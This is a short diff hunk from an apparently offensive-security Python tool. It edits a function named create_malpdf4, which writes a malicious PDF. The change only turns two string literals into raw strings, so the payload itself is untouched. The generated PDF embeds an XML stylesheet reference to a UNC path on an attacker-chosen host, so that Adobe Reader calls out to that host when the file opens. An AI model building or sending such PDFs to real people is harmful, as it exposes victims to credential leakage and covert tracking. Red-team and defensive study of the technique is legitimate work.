@@ -504,12 +504,12 @@ trailer <<
 # From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
 def create_malpdf4(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-
+        file.write(r'''%PDF-
 
 1 0 obj <<>>
 stream
 <?xml version="1.0" ?>
-<?xml-stylesheet href="\\\\''' + host + '''\whatever.xslt" type="text/xsl" ?>
+<?xml-stylesheet href="\\\\''' + host + r'''\whatever.xslt" type="text/xsl" ?>
 endstream
 endobj
 trailer <<
